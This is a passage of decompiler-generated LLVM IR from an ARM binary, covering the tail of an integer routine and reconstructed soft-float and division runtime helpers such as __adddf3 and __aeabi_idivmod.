.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a220, %dec_label_pc_1a214, %bb100
  %v1_1a21c = phi i32 [ %v1_1a218, %dec_label_pc_1a214 ], [ %v2_1a218, %bb100 ], [ %arg1, %dec_label_pc_1a220 ], [ %v2_1a224, %bb101 ], [ %v1_1a23880, %bb103 ], [ %v2_1a234, %bb104 ]
  ret i32 %v1_1a21c

dec_label_pc_1a220:                               ; preds = %thread-pre-split
  br i1 %v1_1a168, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a220
  %v2_1a224 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1a22c:                               ; preds = %bb86
  br i1 %v3_1a188, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a22c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a22c, %bb102
  %v1_1a23880 = phi i32 [ %arg1, %dec_label_pc_1a22c ], [ 0, %bb102 ]
  br i1 %v9_1a188, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a230 = ashr i32 %v2_1a16c, 31
  %v2_1a234 = or i32 %v4_1a230, 1
  br label %.thread16

dec_label_pc_1a23c:                               ; preds = %dec_label_pc_1a190
  %v2_1a23c = icmp ugt i32 %v1_1a240, 65535
  br i1 %v2_1a23c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a23c
  %v2_1a240 = and i32 %v1_1a240, 32768
  %v3_1a240 = icmp eq i32 %v2_1a240, 0
  %v4_1a240 = udiv i32 %v1_1a240, 65536
  br i1 %v3_1a240, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a23c
  %v0_1a24c70 = phi i32 [ %v1_1a240, %dec_label_pc_1a23c ], [ %v4_1a240, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a250 = phi i32 [ %v0_1a24c70, %.thread19 ], [ %v4_1a240, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a24c = icmp ugt i32 %v1_1a250, 255
  br i1 %v2_1a24c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a250 = and i32 %v1_1a250, 128
  %v3_1a250 = icmp eq i32 %v2_1a250, 0
  %v4_1a250 = udiv i32 %v1_1a250, 256
  br i1 %v3_1a250, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a254 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a260 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a254, %bb108 ]
  %v1_1a25c = phi i32 [ %v1_1a250, %bb106 ], [ %v4_1a250, %bb107 ], [ %v4_1a250, %bb108 ]
  %v2_1a258 = icmp ugt i32 %v1_1a25c, 15
  br i1 %v2_1a258, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a25c = and i32 %v1_1a25c, 8
  %v3_1a25c = icmp eq i32 %v2_1a25c, 0
  %v4_1a25c = udiv i32 %v1_1a25c, 16
  br i1 %v3_1a25c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a260 = add nsw i32 %v1_1a260, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a268 = phi i32 [ %v1_1a260, %.thread20 ], [ %v1_1a260, %bb109 ], [ %v2_1a260, %bb110 ]
  %v5_1a26c = phi i32 [ %v1_1a25c, %.thread20 ], [ %v4_1a25c, %bb109 ], [ %v4_1a25c, %bb110 ]
  %v2_1a264 = icmp ugt i32 %v5_1a26c, 3
  %v7_1a264 = icmp eq i32 %v5_1a26c, 4
  %v2_1a268 = xor i1 %v7_1a264, true
  %v3_1a268 = and i1 %v2_1a264, %v2_1a268
  br i1 %v3_1a268, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a268 = add nsw i32 %v4_1a268, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1a26c = phi i32 [ %v4_1a268, %.thread21 ], [ %v5_1a268, %bb111 ]
  %v2_1a26c = xor i1 %v2_1a264, true
  %v3_1a26c = or i1 %v7_1a264, %v2_1a26c
  br i1 %v3_1a26c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a26c = udiv i32 %v5_1a26c, 2
  %v9_1a26c = add i32 %v4_1a26c, %v8_1a26c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a274 = phi i32 [ %v4_1a26c, %bb112 ], [ %v9_1a26c, %bb113 ]
  %v1_1a270 = icmp slt i32 %v2_1a16c, 0
  %v6_1a274 = lshr i32 %v0_1a274, %v1_1a274
  %v2_1a278 = sub i32 0, %v6_1a274
  %v2_1a278.v6_1a274 = select i1 %v1_1a270, i32 %v2_1a278, i32 %v6_1a274
  ret i32 %v2_1a278.v6_1a274

dec_label_pc_1a280:                               ; preds = %entry
  %v0_1a284 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a26c, { 1, 0 }
  uselistorder i1 %v7_1a264, { 1, 0 }
  uselistorder i32 %v4_1a25c, { 1, 0 }
  uselistorder i32 %v1_1a25c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a250, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a250, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a240, { 1, 0 }
  uselistorder i32 %v0_1a204, { 1, 0 }
  uselistorder i32 %v4_1a1f8, { 1, 0 }
  uselistorder i32 %v1_1a200, { 1, 2, 0 }
  uselistorder i32 %v4_1a1ec, { 1, 0 }
  uselistorder i32 %v1_1a1f4, { 1, 2, 0 }
  uselistorder i32 %v4_1a1e0, { 1, 0 }
  uselistorder i32 %v1_1a1e8, { 1, 2, 0 }
  uselistorder i32 %v1_1a20c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a1dc, { 1, 0 }
  uselistorder i32 %v1_1a208, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a1c8, { 1, 0 }
  uselistorder i32 %v3_1a1c4, { 1, 0 }
  uselistorder i32 %v1_1a1c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a1c0, { 1, 0 }
  uselistorder i32 %v1_1a1c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a1b4, { 1, 0 }
  uselistorder i32 %v4_1a1b0, { 2, 1, 0 }
  uselistorder i32 %v1_1a1b4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a1bc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a188, { 1, 0 }
  uselistorder i32 %v1_1a240, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a16c, { 1, 0, 2 }
  uselistorder i32 %v0_1a168, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a214, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a1d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a1bcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a298 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a298
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1a2b0 = bitcast i64 %tmp to double
  %v9_1a2b0 = fadd double %v8_1a2b0, %arg1
  %v10_1a2b0 = fptrunc double %v9_1a2b0 to float
  %v11_1a2b0 = bitcast float %v10_1a2b0 to i32
  ret i32 %v11_1a2b0
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1a2b4 = load i32, i32* @r0, align 4
  ret i32 %v2_1a2b4
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a2b8 = load i32, i32* @r4, align 4
  store i32 %v3_1a2b8, i32* %stack_var_-12, align 4
  %v6_1a2b8 = load i32, i32* @r5, align 4
  %v9_1a2b8 = load i32, i32* @lr, align 4
  %v0_1a2bc = load i32, i32* %r1.global-to-local, align 4
  %v2_1a2bc = mul i32 %v0_1a2bc, 2
  store i32 %v2_1a2bc, i32* %r4.global-to-local, align 4
  %v0_1a2c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a2c0 = mul i32 %v0_1a2c0, 2
  store i32 %v2_1a2c0, i32* %r5.global-to-local, align 4
  %v4_1a2c4 = icmp eq i32 %v2_1a2c0, %v2_1a2bc
  %v1_1a2c8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1a2c4, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1a2c8 = load i32, i32* %r2.global-to-local, align 4
  %v5_1a2c8 = icmp eq i32 %v2_1a2c8, %v1_1a2c8
  br i1 %v5_1a2c8, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1a2cc = or i32 %v1_1a2c8, %v2_1a2bc
  %v5_1a2cc = icmp eq i32 %v3_1a2cc, 0
  br i1 %v5_1a2cc, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1a2d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a2d0 = or i32 %v2_1a2d0, %v2_1a2c0
  %v5_1a2d0 = icmp eq i32 %v3_1a2d0, 0
  br i1 %v5_1a2d0, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1a2bc.off = add i32 %v2_1a2bc, 4194303
  %tmp = icmp ult i32 %v2_1a2bc.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1a2c0.off = add i32 %v2_1a2c0, 4194303
  %tmp17 = icmp ult i32 %v2_1a2c0.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1a2dc = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1a2dc, i32 ptrtoint (i32* @global_var_1a514.975 to i32))
  %v0_1a2e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a2e0 = udiv i32 %v0_1a2e0, 2097152
  store i32 %v3_1a2e0, i32* %r4.global-to-local, align 4
  %v1_1a2e4 = load i32, i32* %r5.global-to-local, align 4
  %v4_1a2e4 = udiv i32 %v1_1a2e4, 2097152
  %v5_1a2e4 = sub nsw i32 %v4_1a2e4, %v3_1a2e0
  %v5_1a2e8 = icmp ult i32 %v4_1a2e4, %v3_1a2e0
  br i1 %v5_1a2e8, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1a2e8 = sub nsw i32 0, %v5_1a2e4
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1a2e8, %bb13 ], [ %v5_1a2e4, %.thread3 ]
  %v0_1a30c = phi i32 [ %v7_1a2e8, %bb13 ], [ %v5_1a2e4, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1a2ec = icmp ugt i32 %v4_1a2e4, %v3_1a2e0
  br i1 %v7_1a2ec, label %dec_label_pc_1a2f0, label %dec_label_pc_1a30c

dec_label_pc_1a2f0:                               ; preds = %bb14
  %v2_1a2f0 = add nsw i32 %v0_1a30c, %v3_1a2e0
  store i32 %v2_1a2f0, i32* %r4.global-to-local, align 4
  %v0_1a2f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a2f4 = load i32, i32* %r2.global-to-local, align 4
  %v0_1a2f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1a2f4, i32* %r0.global-to-local, align 4
  store i32 %v1_1a2f8, i32* %r1.global-to-local, align 4
  store i32 %v0_1a2f4, i32* %r2.global-to-local, align 4
  store i32 %v0_1a2f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a30c

dec_label_pc_1a30c:                               ; preds = %bb14, %dec_label_pc_1a2f0
  %tmp18 = icmp ugt i32 %v0_1a30c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a30c
  %v6_1a310 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1a310, i32* %r4.global-to-local, align 4
  store i32 %v6_1a2b8, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a30c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1a2b8)
  %v0_1a318 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a318 = icmp sgt i32 %v0_1a318, -1
  %v4_1a324 = urem i32 %v0_1a318, 1048576
  %v5_1a324 = or i32 %v4_1a324, 1048576
  store i32 %v5_1a324, i32* %r1.global-to-local, align 4
  br i1 %v3_1a318, label %dec_label_pc_1a334, label %dec_label_pc_1a32c

dec_label_pc_1a32c:                               ; preds = %bb16
  %v0_1a32c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a32c = sub i32 0, %v0_1a32c
  store i32 %v1_1a32c, i32* %r0.global-to-local, align 4
  %v2_1a32c = icmp eq i32 %v0_1a32c, 0
  %v2_1a330 = icmp eq i1 %v2_1a32c, false
  %v5_1a330 = sext i1 %v2_1a330 to i32
  %v6_1a330 = sub nsw i32 %v5_1a330, %v5_1a324
  store i32 %v6_1a330, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a334

dec_label_pc_1a334:                               ; preds = %bb16, %dec_label_pc_1a32c
  %v0_1a334 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a334 = icmp sgt i32 %v0_1a334, -1
  %v4_1a33c = urem i32 %v0_1a334, 1048576
  %v5_1a33c = or i32 %v4_1a33c, 1048576
  store i32 %v5_1a33c, i32* %r3.global-to-local, align 4
  br i1 %v3_1a334, label %dec_label_pc_1a34c, label %dec_label_pc_1a344

dec_label_pc_1a344:                               ; preds = %dec_label_pc_1a334
  %v0_1a344 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a344 = sub i32 0, %v0_1a344
  store i32 %v1_1a344, i32* %r2.global-to-local, align 4
  %v2_1a344 = icmp eq i32 %v0_1a344, 0
  %v2_1a348 = icmp eq i1 %v2_1a344, false
  %v5_1a348 = sext i1 %v2_1a348 to i32
  %v6_1a348 = sub nsw i32 %v5_1a348, %v5_1a33c
  store i32 %v6_1a348, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a34c

dec_label_pc_1a34c:                               ; preds = %dec_label_pc_1a334, %dec_label_pc_1a344
  %v0_1a34c = load i32, i32* %r4.global-to-local, align 4
  %v1_1a34c = load i32, i32* %r5.global-to-local, align 4
  %v4_1a34c = icmp eq i32 %v1_1a34c, %v0_1a34c
  call void @__pseudo_cond_branch(i1 %v4_1a34c, i32 ptrtoint (i32* @global_var_1a4fc.976 to i32))
  %v1_1a350 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a350

; uselistorder directives
  uselistorder i32 %v0_1a334, { 1, 0 }
  uselistorder i32 %v0_1a318, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1a2e4, { 2, 1, 0 }
  uselistorder i32 %v3_1a2e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a2c8, { 1, 0 }
  uselistorder i32 %v2_1a2c0, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1a2bc, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1a34c, { 1, 0 }
  uselistorder label %dec_label_pc_1a334, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1a30c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a354() local_unnamed_addr {
dec_label_pc_1a354:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1a354 = load i32, i32* @r4, align 4
  %v1_1a354 = add i32 %v0_1a354, -1
  store i32 %v1_1a354, i32* @r4, align 4
  %v0_1a358 = load i32, i32* @r5, align 4
  %v1_1a358 = sub i32 32, %v0_1a358
  store i32 %v1_1a358, i32* @lr, align 4
  %v5_1a35c = icmp sgt i32 %v0_1a358, 32
  br i1 %v5_1a35c, label %dec_label_pc_1a378, label %dec_label_pc_1a360

dec_label_pc_1a360:                               ; preds = %dec_label_pc_1a354
  %v0_1a360 = load i32, i32* @r2, align 4
  %v6_1a360 = shl i32 %v0_1a360, %v1_1a358
  store i32 %v6_1a360, i32* %ip.global-to-local, align 4
  %v0_1a364 = load i32, i32* @r0, align 4
  %v3_1a364 = add i32 %v0_1a358, -1
  %v4_1a364 = shl i32 1, %v3_1a364
  %v7_1a364 = lshr i32 %v0_1a360, %v0_1a358
  %v8_1a364 = add i32 %v0_1a364, %v7_1a364
  %v9_1a364 = icmp ult i32 %v8_1a364, %v0_1a364
  %v0_1a368 = load i32, i32* @r1, align 4
  %v2_1a368 = zext i1 %v9_1a364 to i32
  %v3_1a368 = add i32 %v2_1a368, %v0_1a368
  %v1_1a36c = load i32, i32* @r3, align 4
  %v7_1a36c = shl i32 %v1_1a36c, %v1_1a358
  %v8_1a36c = add i32 %v7_1a36c, %v8_1a364
  store i32 %v8_1a36c, i32* %r0.global-to-local, align 4
  %v5_1a370 = and i32 %v1_1a36c, %v4_1a364
  %v6_1a370 = icmp ne i32 %v5_1a370, 0
  %v7_1a370 = ashr i32 %v1_1a36c, %v0_1a358
  %v9_1a370 = add i32 %v3_1a368, %v7_1a370
  %v10_1a370 = zext i1 %v6_1a370 to i32
  %v11_1a370 = add i32 %v10_1a370, %v9_1a370
  br label %dec_label_pc_1a394

dec_label_pc_1a378:                               ; preds = %dec_label_pc_1a354
  %v1_1a378 = add i32 %v0_1a358, -32
  %v1_1a37c = add i32 %v1_1a358, 32
  store i32 %v1_1a37c, i32* @lr, align 4
  %v0_1a384 = load i32, i32* @r3, align 4
  %v2_1a384 = add i32 %v1_1a358, 31
  %v3_1a384 = lshr i32 -2147483648, %v2_1a384
  %v4_1a384 = and i32 %v0_1a384, %v3_1a384
  %v5_1a384 = icmp ne i32 %v4_1a384, 0
  %v6_1a384 = shl i32 %v0_1a384, %v1_1a37c
  %v2_1a388 = or i32 %v6_1a384, 2
  %v2_1a388.v6_1a384 = select i1 %v5_1a384, i32 %v2_1a388, i32 %v6_1a384
  store i32 %v2_1a388.v6_1a384, i32* %ip.global-to-local, align 4
  %v0_1a38c = load i32, i32* @r0, align 4
  %v7_1a38c = ashr i32 %v0_1a384, %v1_1a378
  %v8_1a38c = add i32 %v0_1a38c, %v7_1a38c
  store i32 %v8_1a38c, i32* %r0.global-to-local, align 4
  %v0_1a390 = load i32, i32* @r1, align 4
  %v2_1a390 = and i32 %v0_1a384, 1073741824
  %v3_1a390 = icmp ne i32 %v2_1a390, 0
  %v4_1a390 = ashr i32 %v0_1a384, 31
  %v6_1a390 = add i32 %v0_1a390, %v4_1a390
  %v7_1a390 = zext i1 %v3_1a390 to i32
  %v8_1a390 = add i32 %v6_1a390, %v7_1a390
  br label %dec_label_pc_1a394

dec_label_pc_1a394:                               ; preds = %dec_label_pc_1a360, %dec_label_pc_1a378
  %storemerge = phi i32 [ %v11_1a370, %dec_label_pc_1a360 ], [ %v8_1a390, %dec_label_pc_1a378 ]
  %v0_1a394 = phi i32 [ %v11_1a370, %dec_label_pc_1a360 ], [ %v8_1a390, %dec_label_pc_1a378 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1a394 = and i32 %v0_1a394, -2147483648
  store i32 %v1_1a394, i32* @r5, align 4
  %v1_1a398 = icmp sgt i32 %v0_1a394, -1
  call void @__pseudo_cond_branch(i1 %v1_1a398, i32 ptrtoint (i32* @global_var_1a3a8.977 to i32))
  %v0_1a39c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a39c = sub i32 0, %v0_1a39c
  store i32 %v1_1a39c, i32* %ip.global-to-local, align 4
  %v2_1a39c = icmp eq i32 %v0_1a39c, 0
  %v0_1a3a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a3a0 = icmp eq i1 %v2_1a39c, false
  %v5_1a3a0 = sext i1 %v2_1a3a0 to i32
  %v6_1a3a0 = sub i32 %v5_1a3a0, %v0_1a3a0
  store i32 %v6_1a3a0, i32* %r0.global-to-local, align 4
  %v7_1a3a0 = zext i1 %v2_1a3a0 to i32
  %v8_1a3a0 = icmp ne i32 %v6_1a3a0, %v7_1a3a0
  %v9_1a3a0 = icmp ne i32 %v0_1a3a0, -1
  %v10_1a3a0 = or i1 %v9_1a3a0, %v8_1a3a0
  %v11_1a3a0 = icmp ne i32 %v0_1a3a0, 0
  %v12_1a3a0 = select i1 %v2_1a3a0, i1 %v10_1a3a0, i1 %v11_1a3a0
  %v0_1a3a4 = load i32, i32* %r1.global-to-local, align 4
  %v5_1a3a4 = sext i1 %v12_1a3a0 to i32
  %v6_1a3a4 = sub i32 %v5_1a3a4, %v0_1a3a4
  store i32 %v6_1a3a4, i32* @r1, align 4
  ret i32 %v6_1a3a0

; uselistorder directives
  uselistorder i1 %v2_1a3a0, { 1, 2, 0 }
  uselistorder i32 %v0_1a3a0, { 1, 2, 0 }
  uselistorder i32 %v8_1a390, { 1, 0 }
  uselistorder i32 %v0_1a384, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1a370, { 1, 0 }
  uselistorder i32 %v1_1a36c, { 1, 0, 2 }
  uselistorder i32 %v0_1a364, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1a394, { 1, 0 }
}

define i32 @function_1a3a8(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a3a8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1a3a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a3ac = icmp ult i32 %v0_1a3a8, 1048574
  br i1 %v3_1a3ac, label %dec_label_pc_1a3f0, label %dec_label_pc_1a3b0

dec_label_pc_1a3b0:                               ; preds = %dec_label_pc_1a3a8
  %v3_1a3b4 = icmp ult i32 %v0_1a3a8, 2097150
  br i1 %v3_1a3b4, label %dec_label_pc_1a3d4, label %dec_label_pc_1a3b8

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a3b0
  %v1_1a3b8 = urem i32 %v0_1a3a8, 2
  %v2_1a3b8 = icmp ne i32 %v1_1a3b8, 0
  %v3_1a3b8 = udiv i32 %v0_1a3a8, 2
  store i32 %v3_1a3b8, i32* %r1.global-to-local, align 4
  %v0_1a3bc = load i32, i32* %r0.global-to-local, align 4
  %v3_1a3bc = zext i1 %v2_1a3b8 to i32
  %v6_1a3bc = zext i32 %v0_1a3bc to i64
  %v7_1a3bc = sub i32 33, %v0_1a3bc
  %v8_1a3bc = zext i32 %v7_1a3bc to i64
  %v9_1a3bc = shl i64 %v6_1a3bc, %v8_1a3bc
  %v10_1a3bc = sub i32 32, %v0_1a3bc
  %v11_1a3bc = shl i32 %v3_1a3bc, %v10_1a3bc
  %v12_1a3bc = zext i32 %v11_1a3bc to i64
  %v14_1a3bc = or i64 %v12_1a3bc, %v9_1a3bc
  %v15_1a3bc = trunc i64 %v14_1a3bc to i32
  %v16_1a3bc = add i32 %v0_1a3bc, -1
  %v17_1a3bc = shl i32 1, %v16_1a3bc
  %v18_1a3bc = and i32 %v17_1a3bc, %v0_1a3bc
  %v19_1a3bc = icmp ne i32 %v18_1a3bc, 0
  store i32 %v15_1a3bc, i32* %r0.global-to-local, align 4
  %v0_1a3c0 = load i32, i32* @ip, align 4
  %v3_1a3c0 = zext i1 %v19_1a3bc to i32
  %v6_1a3c0 = zext i32 %v0_1a3c0 to i64
  %v7_1a3c0 = sub i32 33, %v0_1a3c0
  %v8_1a3c0 = zext i32 %v7_1a3c0 to i64
  %v9_1a3c0 = shl i64 %v6_1a3c0, %v8_1a3c0
  %v10_1a3c0 = sub i32 32, %v0_1a3c0
  %v11_1a3c0 = shl i32 %v3_1a3c0, %v10_1a3c0
  %v12_1a3c0 = zext i32 %v11_1a3c0 to i64
  %v14_1a3c0 = or i64 %v12_1a3c0, %v9_1a3c0
  %v15_1a3c0 = trunc i64 %v14_1a3c0 to i32
  store i32 %v15_1a3c0, i32* @ip, align 4
  %v0_1a3c4 = load i32, i32* @r4, align 4
  %v1_1a3c4 = add i32 %v0_1a3c4, 1
  store i32 %v1_1a3c4, i32* @r4, align 4
  %v3_1a3c8 = mul i32 %v1_1a3c4, 2097152
  %v2_1a3cc = icmp ugt i32 %v3_1a3c8, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1a3cc, i32 ptrtoint (i32* @global_var_1a584.978 to i32))
  br label %dec_label_pc_1a3d4

dec_label_pc_1a3d4:                               ; preds = %dec_label_pc_1a3f0, %dec_label_pc_1a3b0, %dec_label_pc_1a3b8
  %v0_1a3d4 = load i32, i32* @ip, align 4
  %v2_1a3d4 = icmp slt i32 %v0_1a3d4, 0
  %v6_1a3d4 = icmp eq i32 %v0_1a3d4, -2147483648
  %v1_1a3d8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a3d4, label %bb, label %dec_label_pc_1a3d4._crit_edge

bb:                                               ; preds = %dec_label_pc_1a3d4
  %v2_1a3d8 = urem i32 %v1_1a3d8, 2
  %v3_1a3d8 = icmp ne i32 %v2_1a3d8, 0
  br label %dec_label_pc_1a3d4._crit_edge

dec_label_pc_1a3d4._crit_edge:                    ; preds = %dec_label_pc_1a3d4, %bb
  %v1_1a3dc = phi i1 [ %v3_1a3d8, %bb ], [ %v2_1a3d4, %dec_label_pc_1a3d4 ]
  %v2_1a3dc = zext i1 %v1_1a3dc to i32
  %v3_1a3dc = add i32 %v2_1a3dc, %v1_1a3d8
  store i32 %v3_1a3dc, i32* %r0.global-to-local, align 4
  %v0_1a3e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a3e0 = load i32, i32* @r4, align 4
  %v2_1a3e0 = and i32 %v1_1a3e0, 4096
  %v3_1a3e0 = icmp ne i32 %v2_1a3e0, 0
  %v4_1a3e0 = mul i32 %v1_1a3e0, 1048576
  %v6_1a3e0 = add i32 %v4_1a3e0, %v0_1a3e0
  %v7_1a3e0 = zext i1 %v3_1a3e0 to i32
  %v8_1a3e0 = add i32 %v7_1a3e0, %v6_1a3e0
  %v1_1a3e4 = load i32, i32* @r5, align 4
  %v2_1a3e4 = or i32 %v1_1a3e4, %v8_1a3e0
  store i32 %v2_1a3e4, i32* %r1.global-to-local, align 4
  ret i32 %v3_1a3dc

dec_label_pc_1a3f0:                               ; preds = %dec_label_pc_1a3a8
  %v0_1a3f0 = load i32, i32* @ip, align 4
  %v1_1a3f0 = icmp slt i32 %v0_1a3f0, 0
  %v2_1a3f0 = mul i32 %v0_1a3f0, 2
  store i32 %v2_1a3f0, i32* @ip, align 4
  %v0_1a3f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a3f4 = mul i32 %v0_1a3f4, 2
  %v4_1a3f4 = zext i1 %v1_1a3f0 to i32
